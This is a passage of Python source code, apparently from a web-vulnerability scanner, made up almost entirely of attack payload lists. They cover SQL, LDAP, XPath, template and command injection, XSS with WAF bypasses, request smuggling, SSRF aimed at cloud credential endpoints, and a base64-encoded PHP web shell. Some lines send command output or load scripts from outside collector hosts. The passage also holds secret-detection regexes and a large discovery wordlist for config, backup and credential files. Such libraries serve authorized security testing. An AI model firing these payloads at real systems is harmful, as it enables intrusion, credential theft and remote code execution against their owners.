        "' OR 1 LIKE 1 --",
        "' OR 'a' REGEXP 'a' --",
        # Double encoding
        "' %252f%252a*/UNION%252f%252a*/SELECT 1,2,3 --",
        # Parenthesis wrapping
        "' UNION (SELECT 1,2,3) --",
        "' AND (1)=(1) --",
    ]

    # LDAP Injection
    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "*)(&",
        "*## ",
        "*()|%26'",
        "admin)(&)",
        "admin)(!(&(1=0",
        "*()|&'",
        "*)(|(password=*)",
        "admin)(|(objectClass=*))",
        "*))%00",
    ]

    # XPath Injection
    XPATH_PAYLOADS = [
        "' or '1'='1",
        "' or ''='",
        "x' or 1=1 or 'x'='y",
        "1 or 1=1",
        "' or 1=1 or ''='",
        "') or ('1'='1",
        "' or count(parent::*[position()=1])=0 or 'a'='b",
        "' or substring(name(parent::*[position()=1]),1,1)='a' or 'a'='b",
        "1' or '1'='1' or '1'='1",
        "admin' or '1'='1",
    ]

    # HTTP Request Smuggling
    HTTP_SMUGGLING_PAYLOADS = [
        # CL.TE
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
        # TE.CL
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
        # TE.TE obfuscation
        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n",
        # H2.CL
        "POST / HTTP/2\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]

    # Cache Poisoning
    CACHE_POISONING_PAYLOADS = [
        # Unkeyed headers
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Scheme: nothttps",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-Proto: nothttps",
        # Parameter pollution
        "?cb=1&utm_content=x",
        "?x=1%23",
        # Fat GET
        "GET /?param=normal HTTP/1.1\r\nContent-Length: 50\r\n\r\nparam=poisoned",
    ]

    # Advanced XSS - DOM-based
    XSS_DOM_PAYLOADS = [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert&lpar;1&rpar;</script>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)//-->",
    ]

    # Advanced XSS - Polyglot
    XSS_POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik;alert(1)//",
        "'\"-->]]>*/</script></style></noscript></xmp></textarea><img src=x onerror=alert(1)>",
        "-->'\"\\><img src=x onerror=alert(1)>",
        # Modern mXSS
        "<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}</style>",
        # Mutation-based
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        # Modern event handlers
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
    ]

    # Advanced SSRF - Cloud metadata
    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/api/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.170.2/v2/credentials",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/hostname",
        # Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/image-id",
        # Kubernetes
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/pods",
        # Oracle Cloud
        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/opc/v1/instance/metadata/",
    ]

    # CRLF Injection
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlfinjection=true",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
        "\\r\\nX-Injected: header",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlfinjection=true",
    ]

    # HTTP Parameter Pollution
    HPP_PAYLOADS = [
        "&admin=true",
        "&role=admin",
        "&debug=1",
        "&access=all",
        "&auth=bypass",
    ]

    # Prototype Pollution
    PROTO_POLLUTION = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        "__proto__[isAdmin]=true",
        "constructor.prototype.isAdmin=true",
    ]

    # GraphQL Injection
    GRAPHQL_PAYLOADS = [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__type(name:\\"User\\"){name fields{name type{name}}}}"}',
        '{"query":"query{users{id username password email}}"}',
        '{"query":"mutation{createUser(username:\\"admin\\",password:\\"admin\\",role:\\"admin\\"){id}}"}',
    ]

    # ── GitHub-style Secret Scanning Patterns ─────────────────────
    # Regex patterns for detecting leaked secrets/tokens in HTTP
    # responses, based on the techniques used by GitHub secret
    # scanning. Each entry is (name, pattern_string).
    SECRET_PATTERNS = [
        # AWS credentials
        ("AWS Access Key", r"(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"),
        ("AWS Secret Key", r"(?i)aws_?secret_?access_?key\s*[=:]\s*[A-Za-z0-9/+=]{40}"),
        # GitHub tokens
        ("GitHub PAT (classic)", r"ghp_[A-Za-z0-9]{36}"),
        ("GitHub PAT (fine-grained)", r"github_pat_[A-Za-z0-9_]{82}"),
        ("GitHub OAuth", r"gho_[A-Za-z0-9]{36}"),
        ("GitHub App Token", r"(?:ghu|ghs)_[A-Za-z0-9]{36}"),
        ("GitHub App Refresh", r"ghr_[A-Za-z0-9]{36,}"),
        # Google
        ("Google API Key", r"AIza[A-Za-z0-9_\\-]{35}"),
        ("Google OAuth Secret", r"(?i)client_secret\s*[=:]\s*[A-Za-z0-9_\\-]{24}"),
        # Stripe
        ("Stripe Secret Key", r"sk_live_[A-Za-z0-9]{24,}"),
        ("Stripe Publishable Key", r"pk_live_[A-Za-z0-9]{24,}"),
        # Slack
        ("Slack Bot Token", r"xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}"),
        ("Slack Webhook", r"https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}"),
        # Private keys
        ("RSA Private Key", r"-----BEGIN RSA PRIVATE KEY-----"),
        ("SSH Private Key", r"-----BEGIN (?:OPENSSH|DSA|EC) PRIVATE KEY-----"),
        ("PGP Private Key", r"-----BEGIN PGP PRIVATE KEY BLOCK-----"),
        # JWT / Bearer tokens
        ("JWT Token", r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
        ("Bearer Token", r"(?i)bearer\s+[A-Za-z0-9_\-.~+/]{20,}"),
        # Generic API keys / passwords in config
        ("Generic API Key", r'(?i)(?:api[_-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?'),
        ("Generic Secret", r'(?i)(?:secret|password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']'),
        # Database connection strings
        ("Database URL", r'(?i)(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://[^\s"\'<>]{10,}'),
        # Heroku
        (
            "Heroku API Key",
            r"(?i)heroku[_-]?api[_-]?key\s*[=:]\s*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        ),
        # Twilio
        ("Twilio API Key", r"SK[0-9a-f]{32}"),
        # SendGrid
        ("SendGrid API Key", r"SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}"),
        # Mailgun
        ("Mailgun API Key", r"key-[0-9a-zA-Z]{32}"),
        # NPM
        ("NPM Access Token", r"npm_[A-Za-z0-9]{36}"),
        # PyPI
        ("PyPI API Token", r"pypi-[A-Za-z0-9_\-]{50,}"),
    ]

    # ── GitHub Repository Best-Practice Payloads ──────────────────
    # Curated from the most popular GitHub security repositories:
    #   - PayloadsAllTheThings (swisskyrepo)
    #   - SecLists (danielmiessler)
    #   - PortSwigger/xss-cheat-sheet patterns
    #   - sqlmap tamper-style payloads
    #   - WafW00f WAF signatures
    # These are integrated directly — no download or install required.

    # --- Advanced SQLi Auth Bypass (from PayloadsAllTheThings) ---
    SQLI_AUTH_BYPASS = [
        "'-'",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' or ''-'",
        "' or '' '",
        "' or ''&'",
        "' or ''^'",
        "' or ''*'",
        "'-||0#",
        "'-## 0#",
        "'-/**/0#",
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin' or 1=1",
        "admin' or 1=1--",
        "admin' or 1=1#",
        "admin') or ('1'='1",
        "admin') or ('1'='1'--",
        "admin') or ('1'='1'#",
        "admin') or 1=1--",
        "' OR 1=1-- -",
        "' OR 1=1# ",
        "') OR 1=1-- -",
        "') OR ('1'='1'-- -",
        '" or ""="',
        '" or 1=1-- -',
        '" or 1=1#',
        "or 1=1",
        "or 1=1--",
        "or 1=1#",
        "or 1=1/*",
        "' or 1 in (select @@version)-- -",
        "' or 1=1 LIMIT 1-- -",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' GROUP BY 1,2,--+",
    ]

    # --- Advanced XSS (from PortSwigger/PayloadsAllTheThings) ---
    XSS_ADVANCED = [
        # PortSwigger cheat-sheet derived
        "<svg/onload=alert(1)>",
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert(1)//>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=_ onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<audio src onerror=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        # Modern event handlers & contexts
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->",
        "<svg><set onbegin=alert(1) attributeName=x to=1>",
        # Template / framework specific
        "{{constructor.constructor('return this')().alert(1)}}",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        # WAF-evasion XSS (case, encoding, splitting)
        "<IMG SRC=x OnErRoR=alert(1)>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<a href=javas&#99;ript:alert(1)>click</a>",
        # DOM-based blind XSS
        "'\"><script src=https://xss.report/s/test></script>",
        "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3Rlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",
    ]

    # --- Advanced LFI / Path Traversal (from PayloadsAllTheThings/SecLists) ---
    LFI_ADVANCED = [
        # Double encoding
        "..%252f..%252f..%252f..%252fetc/passwd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        # UTF-8 overlong encoding
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        # Null byte (PHP < 5.3.4)
        "../../../../../../etc/passwd%00",
        "../../../../../../etc/passwd%00.php",
        "../../../../../../etc/passwd%00.html",
        # PHP wrapper advanced
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "phar://./test.phar/test.txt",
        # Linux interesting files
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/version",
        "/proc/net/tcp",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        # Windows
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "C:\\windows\\system32\\config\\sam",
    ]

    # --- Advanced SSRF (from PayloadsAllTheThings/SecLists) ---
    SSRF_ADVANCED = [
        # IP obfuscation
        "http://0x7f000001/",
        "http://017700000001/",
        "http://2130706433/",
        "http://0x7f.0x0.0x0.0x1/",
        "http://0177.0000.0000.0001/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://127.1/",
        "http://127.0.1/",
        # DNS rebinding
        "http://spoofed.burpcollaborator.net/",
        "http://localtest.me/",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
        # URL scheme tricks
        "gopher://127.0.0.1:25/_HELO%20localhost",
        "dict://127.0.0.1:11211/stat",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "ldap://127.0.0.1/",
        "tftp://127.0.0.1/test",
        # Cloud metadata — extended
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "http://169.254.169.254/opc/v2/instance/",  # Oracle
        "http://169.254.170.2/v2/credentials",  # AWS ECS
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/pods",
        # SSRF to internal services
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:11211/",
        "http://127.0.0.1:27017/",
    ]

    # --- Advanced Command Injection (from PayloadsAllTheThings) ---
    CMDI_ADVANCED = [
        # IFS-based space bypass
        "cat${IFS}/etc/passwd",
        "cat$IFS/etc/passwd",
        ";${IFS}cat${IFS}/etc/passwd",
        # Quoting tricks
        "c'a't /etc/passwd",
        'c"a"t /etc/passwd',
        "c\\at /etc/passwd",
        "/???/??t /etc/passwd",
        # Brace expansion
        "{cat,/etc/passwd}",
        "{ls,-la,/}",
        # Variable substitution
        "a]a]a;{cat,/etc/passwd}",
        "$({cat,/etc/passwd})",
        # Encoding bypasses
        "`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`",
        "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)",
        "echo${IFS}Y2F0IC9ldGMvcGFzc3dk${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh",
        # Wildcard bypass
        "/e?c/p?sswd",
        "/e*/passwd",
        "cat /etc/pass??",
        "cat /etc/passw*",
        # Newline / tab injection
        "%0aid",
        "%0a/bin/cat%20/etc/passwd",
        "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
        # DNS / OOB
        ";nslookup test.burpcollaborator.net",
        ";curl http://test.burpcollaborator.net/$(whoami)",
        "`wget http://test.burpcollaborator.net/$(id)`",
    ]

    # --- Advanced SSTI (from PayloadsAllTheThings) ---
    SSTI_ADVANCED = [
        # Detection
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "{{'7'*7}}",
        "#{7*7}",
        # Jinja2 (Python)
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}",
        # Twig (PHP)
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        # Freemarker (Java)
        '${"freemarker.template.utility.Execute"?new()("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        # Smarty (PHP)
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        # Pebble (Java)
        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}",
        # ERB (Ruby)
        "<%= system('id') %>",
        "<%= `id` %>",
        # Handlebars (JS)
        '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    ]

    # --- WAF Bypass Payload Library (from WafW00f/WAF-bypass-collection) ---
    WAF_BYPASS_PAYLOADS = {
        "xss_waf": [
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<details/open/ontoggle=alert`1`>",
            "'-alert(1)-'",
            "\\'-alert(1)//",
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '<a href="javascript&colon;alert(1)">click</a>',
            "<svg><script>alert&#40;1&#41;</script>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )",
        ],
        "sqli_waf": [
            "' /*!50000OR*/ 1=1-- -",
            "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3-- -",
            "' OR/**/ 1=1-- -",
            "'/**/OR/**/1=1--/**/-",
            "' /*!50000OR*/ '1'='1'-- -",
            "'-IF(1=1,SLEEP(5),0)--+-",
            "' AND 1=1 ORDER BY 1-- -",
            "' UNION%23%0ASELECT 1,2,3-- -",
            "' UNION%0D%0ASELECT 1,2,3-- -",
            "' UN%49ON SE%4CECT 1,2,3-- -",
        ],
        "lfi_waf": [
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/..%00/..%00/..%00/etc/passwd",
            "..\\..\\..\\..\\etc\\passwd",
            "..%5c..%5c..%5c..%5cetc%5cpasswd",
        ],
        "cmdi_waf": [
            "$(cat${IFS}/etc/passwd)",
            ";cat${IFS}/etc/passwd",
            "|cat<</etc/passwd",
            "`echo${IFS}id`",
            "a]a]a;{cat,/etc/passwd}",
            "$'\\x63at'${IFS}'/etc/passwd'",
        ],
    }

    # --- Content Discovery Paths (from SecLists/dirsearch/gobuster) ---
    # ULTIMATE discovery wordlist covering: environment files, config files,
    # VCS artifacts, CI/CD, backups, admin panels, API docs, debug endpoints,
    # framework-specific paths, log files, upload dirs, and hidden artifacts.
    DISCOVERY_PATHS_EXTENDED = [
        # ── 1. Environment / Configuration Files ──
        "/.env",
        "/.env.bak",
        "/.env.local",
        "/.env.production",
        "/.env.development",
        "/.env.staging",
        "/.env.test",
        "/.env.old",
        "/.env.save",
        "/.env.dist",
        "/.env.example",
        "/config.yml",
        "/config.yaml",
        "/config.json",
        "/config.xml",
        "/config.php",
        "/config.php.bak",
        "/config.php~",
        "/config.php.old",
        "/config.inc",
        "/config.inc.php",
        "/configuration.php",
        "/settings.py",
        "/local_settings.py",
        "/prod_settings.py",
        "/application.properties",
        "/application.yml",
        "/application.yaml",
        "/runtime.properties",
        "/appsettings.json",
        "/appsettings.Development.json",
        "/appsettings.Production.json",
        "/appsettings.Staging.json",
        "/wp-config.php",
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.php~",
        "/wp-config.php.orig",
        "/wp-config.php.save",
        "/web.config",
        "/app.config",
        "/application.config",
        "/.htaccess",
        "/.htpasswd",
        "/.htgroups",
        "/nginx.conf",
        "/.htrouter.php",
        "/php.ini",
        "/.user.ini",
        "/robots.txt",
        "/sitemap.xml",
        "/sitemap.xml.gz",
        "/crossdomain.xml",
        "/clientaccesspolicy.xml",
        "/security.txt",
        "/.well-known/security.txt",
        # ── 2. Version Control & CI/CD Artifacts ──
        "/.git/",
        "/.git/HEAD",
        "/.git/config",
        "/.git/index",
        "/.git/packed-refs",
        "/.git/refs/heads/main",
        "/.git/refs/heads/master",
        "/.git/refs/stash",
        "/.git/logs/HEAD",
        "/.git/COMMIT_EDITMSG",
        "/.git/description",
        "/.git/info/exclude",
        "/.gitignore",
        "/.gitattributes",
        "/.gitmodules",
        "/.svn/",
        "/.svn/entries",
        "/.svn/wc.db",
        "/.hg/",
        "/.hg/hgrc",
        "/.hg/store",
        "/.bzr/",
        "/.bzr/branch-format",
        "/.cvs/",
        "/.github/",
        "/.github/workflows/",
        "/.gitlab/",
        "/.gitlab-ci.yml",
        "/.azuredevops/",
        "/Jenkinsfile",
        "/.jenkins/",
        "/.circleci/",
        "/.circleci/config.yml",
        "/.travis.yml",
        "/.drone.yml",
        "/bitbucket-pipelines.yml",
        "/Dockerfile",
        "/docker-compose.yml",
        "/docker-compose.yaml",
        "/docker-compose.override.yml",
        "/.dockerenv",
        "/.dockerignore",
        "/Vagrantfile",
        "/Procfile",
        "/Makefile",
        # ── 3. Dependency / Build Files ──
        "/package.json",
        "/package-lock.json",
        "/yarn.lock",
        "/pnpm-lock.yaml",
        "/composer.json",
        "/composer.lock",
        "/Gemfile",
        "/Gemfile.lock",
        "/requirements.txt",
        "/Pipfile",
        "/Pipfile.lock",
        "/poetry.lock",
        "/pyproject.toml",
        "/setup.py",
        "/setup.cfg",
        "/go.mod",
        "/go.sum",
        "/Cargo.toml",
        "/Cargo.lock",
        "/pom.xml",
        "/build.gradle",
        "/build.gradle.kts",
        "/build.xml",
        "/ivy.xml",
        "/mix.exs",
        "/rebar.config",
        "/Makefile",
        "/CMakeLists.txt",
        # ── 4. Backup & Archive Files ──
        "/backup.sql",
        "/backup.zip",
        "/backup.tar.gz",
        "/backup.tar",
        "/backup.7z",
        "/backup.rar",
        "/backup.bak",
        "/db.sql",
        "/database.sql",
        "/dump.sql",
        "/data.sql",
        "/db.sqlite",
        "/db.sqlite3",
        "/database.db",
        "/site.tar.gz",
        "/site.zip",
        "/www.zip",
        "/www.tar.gz",
        "/public.zip",
        "/html.zip",
        "/html.tar.gz",
        "/web.zip",
        "/app.zip",
        "/source.zip",
        "/src.zip",
        "/old/",
        "/bak/",
        "/copy/",
        "/temp/",
        "/backup/",
        "/backups/",
        "/archive/",
        "/archives/",
        "/index.php.bak",
        "/index.php.old",
        "/index.php~",
        "/index.html.bak",
        "/index.html.old",
        "/.sql",
        "/dump.psql",
        "/data.dump",
        # ── 5. Admin & Sensitive Directories ──
        "/admin",
        "/admin/",
        "/admin/login",
        "/admin/dashboard",
        "/administrator/",
        "/administrator/login",
        "/manage/",
        "/manager/",
        "/manager/html",
        "/console",
        "/console/",
        "/h2-console/",
        "/dashboard/",
        "/cp/",
        "/cpanel/",
        "/webmail/",
        "/webadmin/",
        "/system/",
        "/monitoring/",
        "/nagios/",
        "/phpmyadmin/",
        "/pma/",
        "/mysql/",
        "/adminer/",
        "/sqladmin/",
        "/phpinfo.php",
        "/info.php",
        "/pi.php",
        "/test.php",
        "/server-status",
        "/server-info",
        "/wp-admin/",
        "/wp-login.php",
        # ── 6. API & Data Endpoints ──
        "/swagger.json",
        "/swagger.yaml",
        "/swagger-ui.html",
        "/swagger-ui/",
        "/openapi.json",
        "/openapi.yaml",
        "/openapi/v3/api-docs",
        "/api-docs",
        "/api-docs/",
        "/api/docs",
        "/api/swagger",
        "/v1/api-docs",
        "/v2/api-docs",
        "/v3/api-docs",
        "/graphql",
        "/graphiql",
        "/altair",
        "/playground",
        "/__graphql",
        "/graphql/console",
        "/api/",
        "/rest/",
        "/soap/",
        "/rpc/",
        "/api/health",
        "/api/status",
        "/api/version",
        "/api/v1/",
        "/api/v2/",
        "/api/v3/",
        "/api/latest/",
        "/json",
        "/xml",
        "/rss",
        "/feed",
        "/sitemap",
        "/webhook/",
        "/callback/",
        "/notify/",
        "/event/",
        "/jsonrpc",
        "/xmlrpc",
        "/xmlrpc.php",
        # ── 7. Debug / Info / Actuator Endpoints ──
        "/actuator",
        "/actuator/env",
        "/actuator/health",
        "/actuator/info",
        "/actuator/mappings",
        "/actuator/beans",
        "/actuator/configprops",
        "/actuator/trace",
        "/actuator/heapdump",
        "/actuator/threaddump",
        "/actuator/loggers",
        "/actuator/metrics",
        "/actuator/scheduledtasks",
        "/actuator/httptrace",
        "/actuator/jolokia",
        "/actuator/auditLog",
        "/_debug",
        "/__debug__/",
        "/debug/",
        "/debug/pprof/",
        "/debug/vars",
        "/debug/requests",
        "/trace",
        "/metrics",
        "/stats",
        "/status",
        "/health",
        "/healthcheck",
        "/health-check",
        "/monitor",
        "/monitoring",
        "/elmah.axd",
        "/errorlog.axd",
        "/_profiler/",
        "/_wdt/",  # Symfony profiler
        # ── 8. Log Files ──
        "/logs/",
        "/log/",
        "/debug.log",
        "/error.log",
        "/access.log",
        "/audit.log",
        "/application.log",
        "/app.log",
        "/laravel.log",
        "/storage/logs/laravel.log",
        "/wordpress.log",
        "/wp-content/debug.log",
        "/django.log",
        "/rails.log",
        "/server.log",
        "/catalina.out",
        "/error_log",
        "/access_log",
        "/stacktrace.log",
        "/trace.log",
        "/syslog",
        "/messages",
        # ── 9. Upload & File Handling Directories ──
        "/upload/",
        "/uploads/",
        "/files/",
        "/download/",
        "/downloads/",
        "/media/",
        "/images/",
        "/assets/",
        "/static/",
        "/userfiles/",
        "/usercontent/",
        "/user_uploads/",
        "/profile_pics/",
        "/avatars/",
        "/attachments/",
        "/documents/",
        "/reports/",
        "/invoices/",
        "/tmp_upload/",
        "/temp_upload/",
        "/import/",
        "/export/",
        # ── 10. WordPress ──
        "/wp-content/",
        "/wp-content/plugins/",
        "/wp-content/themes/",
        "/wp-content/uploads/",
        "/wp-includes/",
        "/wp-config.php.bak",
        "/wp-config.php~",
        "/wp-config.old",
        "/xmlrpc.php",
        "/wp-cron.php",
        "/wp-links-opml.php",
        "/wp-json/",
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages",
        "/wp-content/debug.log",
        "/readme.html",
        "/license.txt",
        # ── 11. Laravel ──
        "/storage/",
        "/storage/framework/",
        "/storage/logs/",
        "/storage/logs/laravel.log",
        "/bootstrap/cache/",
        "/bootstrap/cache/config.php",
        "/_ide_helper.php",
        "/_ide_helper_models.php",
        "/artisan",
        "/.env.backup",
        "/vendor/autoload.php",
        # ── 12. Django ──
        "/static/",
        "/media/",
        "/admin/",
        "/__pycache__/",
        "/settings.py",
        "/urls.py",
        "/django/admin/",
        "/django/static/",
        # ── 13. Ruby on Rails ──
        "/public/assets/",
        "/public/uploads/",
        "/db/",
        "/db/seeds.rb",
        "/db/schema.rb",
        "/config/",
        "/config/database.yml",
        "/config/secrets.yml",
        "/config/master.key",
        "/config/credentials.yml.enc",
        "/config/initializers/",
        # ── 14. ASP.NET ──
        "/App_Data/",
        "/App_Code/",
        "/bin/",
        "/obj/",
        "/Web.config",
        "/web.config.bak",
        "/Global.asax",
        "/Default.aspx",
        # ── 15. Java (Spring, Struts, Tomcat) ──
        "/WEB-INF/",
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/",
        "/META-INF/",
        "/META-INF/MANIFEST.MF",
        "/resources/",
        "/static/",
        "/templates/",
        "/WEB-INF/spring/",
        "/WEB-INF/struts-config.xml",
        "/WEB-INF/ibm-web-bnd.xml",
        "/WEB-INF/ibm-web-ext.xml",
        "/WEB-INF/jboss-web.xml",
        "/WEB-INF/jetty-web.xml",
        "/WEB-INF/web-fragment.xml",
        # ── 15b. XML / WSDL / SOAP / API Specification Files ──
        "/ws/service.wsdl",
        "/wsdl",
        "/service.wsdl",
        "/services.wsdl",
        "/api.wsdl",
        "/Service?wsdl",
        "/Service?WSDL",
        "/services/Service?wsdl",
        "/soap/Service?wsdl",
        "/ws/Service?wsdl",
        "/?wsdl",
        "/service.asmx?WSDL",
        "/service.svc?wsdl",
        "/service.svc?singleWsdl",
        # XSD / XML Schema
        "/schema.xsd",
        "/api.xsd",
        "/types.xsd",
        "/service.xsd",
        # WADL (Web Application Description Language)
